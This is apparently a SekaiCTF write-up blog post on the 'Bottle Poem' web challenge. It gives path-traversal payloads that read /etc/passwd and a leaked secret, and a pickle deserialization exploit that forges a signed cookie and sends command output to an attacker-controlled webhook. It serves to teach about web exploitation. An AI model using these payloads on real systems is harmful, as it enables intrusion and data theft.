---
layout: post
current: post
cover:  False
navigation: True
title: "Bottle Poem"
date: 2022-11-03 10:00:00
tags: [SekaiCTF, web]
class: post-template
subclass: 'post'
author: Ace314159
---

For this web challenge, we had to utilize two different exploits to get the flag -- and one of them wasn't a web exploit!

## Setup

We're presented with a website where we can select different poems to view. When we click on a poem, we can see that the URL contains the name of a text file: `/show?id=spring.txt`.

## Local File Inclusion (LFI)

The first thing that comes to mind when we can access arbitrary files on a web server is Local File Inclusion (LFI). We tried it out by trying to access /etc/passwd `/show?id=../../etc/passwd`. We were successful! 

Next, we wanted to get the source code of the website for further analysis of where the flag could be. After some Googling, we found that we can read the `/proc/self/cmdline` file to get the command line arguments of the current process. This yielded `"python3", "-u", "/app/app.py"`. Thus, we can access `app.py` using `/show?id=../../app/app.py`, giving us this file:

```python
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```

## Getting Trolled

The code shows that there's an admin template that only an admin user can access. However, since we have LFI, we can just access the template directly: `/show?id=../../app/views/admin.html`. This gives us the template

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sekai's boooootttttttlllllllleeeee</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="text-white bg-zinc-800 container px-4 mx-auto text-center h-screen box-border flex justify-center item-center flex-col">
    Hello, you are {{name}}, but it’s useless.
</body>
</html>
```

No flag :(

## Pickle Fun

We had to keep looking. The next thing that came to mind was seeing if we could control the `session` variable. This wouldn't help us with the admin page, since we already know the admin template is useless, but maybe we can do something else with it. Looking at the source of `get_cookie`, we see that it calls `cookie_decode`, which looks like this:

```python
def cookie_decode(data, key):
    ''' Verify and decode an encoded string. Return an object or None.'''
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):
            return pickle.loads(base64.b64decode(msg))
    return None
```

`pickle`! The code uses pickle to load arbitrary data from the cookie. This gives us Remote Code Execution (RCE), which we can use to search for the flag. The way we can get RCE using pickle is by pickling a class with the `__reduce__` method. It returns a tuple, where the first value is a function, and the second value is the arguments passed into the function. When `pickle.loads` is called, it will call the function with the arguments. We can use this in conjunction with the python `exec` function to get RCE.

Our final exploit just runs the flag executable (which we found using the same exploit strategy), and then sends the output as a payload to a webhook URL we control. (You can create webhook URLs with a site like [RequestBin](https://requestbin.com/).) Here's the class that we used in our final exploit:

```python
code = """
import urllib.request
import os
import subprocess

path = os.path.join(os.getcwd(), "../flag")
try:
    data = str(subprocess.run([path], capture_output=True)).encode("utf-8")
except Exception as e:
    data = str(e).encode("utf-8")

req = urllib.request.Request(WEBHOOK_URL, data=data)

urllib.request.urlopen(req)
"""

class RCE:
    def __reduce__(self):
        return exec, (code,)
```


However, before we get RCE on the server, we need to find the secret the session cookie is encrypted with. Without that, we can't change the cookie. The secret is imported at the top of the web server file, so could we just load the imported file using LFI? Let's take a look at `/show?id=../../app/config/secret.py`:

```python
sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
```

Perfect! Now we just have to construct our payload! Looking near `cookie_decode`, we see `cookie_encode`, which looks like this:

```python
def cookie_encode(data, key):
    ''' Encode and sign a pickle-able object. Return a (byte) string '''
    msg = base64.b64encode(pickle.dumps(data, -1))
    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
    return tob('!') + sig + tob('?') + msg
```

After stealing that code, we can complete our exploit.

```python
data = RCE()

msg = base64.b64encode(pickle.dumps(data, -1))
sig = base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())
print(tob('!') + sig + tob('?') + msg)
```

And we have the flag! Here's the full code:

```python
code = """
import urllib.request
import os
import subprocess

path = os.path.join(os.getcwd(), "../flag")
try:
    data = str(subprocess.run([path], capture_output=True)).encode("utf-8")
except Exception as e:
    data = str(e).encode("utf-8")

req = urllib.request.Request(WEBHOOK_URL, data=data)

urllib.request.urlopen(req)
"""


class RCE:
    def __reduce__(self):
        return exec, (code,)


data = RCE()

msg = base64.b64encode(pickle.dumps(data, -1))
sig = base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())
print(tob('!') + sig + tob('?') + msg)
```

Flag: `SEKAI{W3lcome_To_Our_Bottle}`